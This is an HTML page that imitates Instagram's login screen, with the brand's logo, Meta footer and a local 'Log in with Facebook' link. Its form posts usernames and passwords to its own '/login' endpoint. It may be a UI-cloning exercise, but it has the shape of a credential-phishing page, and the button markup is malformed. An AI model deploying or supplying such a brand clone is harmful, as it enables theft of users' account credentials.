<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
</head>

<body>
    <main>
        <div id="main-container">
            <!-- Banner -->
            <div id="banner-container">
                <img src="img/banner2.png" alt="Crie Sua Conta No Instagram">
            </div>
            <!-- Login -->
            <div id="form-container">
                <div id="form-box">
                    <img id="logo-insta" src="img/logo_instagram.png" alt="Instagram">
                    <form id="login-form" action="/login" method="post">

                        <input type="text" id="username" name="username" placeholder="Phone number, username, or email"required>

                        <input type="password" id="password" name="password" placeholder="Password" required>
                        
                        <button type="submit"><a href="https://www.instagram.com/" + username></a>log in</button>

                    </form>
                    <div class="separator">
                        <div class="line"></div>
                        <span>OR</span>
                    </div>
                    <div id="other-links">
                        <div id="facebook-login">
                            <a href="facebook.html">
                                <img src="img/logo_facebook.svg" alt="Facebook login">
                                <span>Log in with Facebook</span>
                            </a>
                        </div>
                        <div id="forgot-pass">
                            <a href="#">Forgot password?</a>
                        </div>
                    </div>
                </div>
                <div id="register-container">
                    <p>Don't have an account? <a href="register.html">Sign up</a></p>
                </div>
                <div id="get-app-container">
                    <p>Get the app.</p>
                    <a href="#">
                        <img src="img/apple_btn.jpg" alt="Apple Store">
                    </a>
                    <a href="#">
                        <img src="img/gplay_btn.png" alt="Google Play">
                    </a>
                </div>
            </div>
        </div>
    </main>
    <div class="footer">
        <div class="links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <div class="language">English ▼ © 2025 Instagram from Meta</div>
    </div>
</body>

</html>
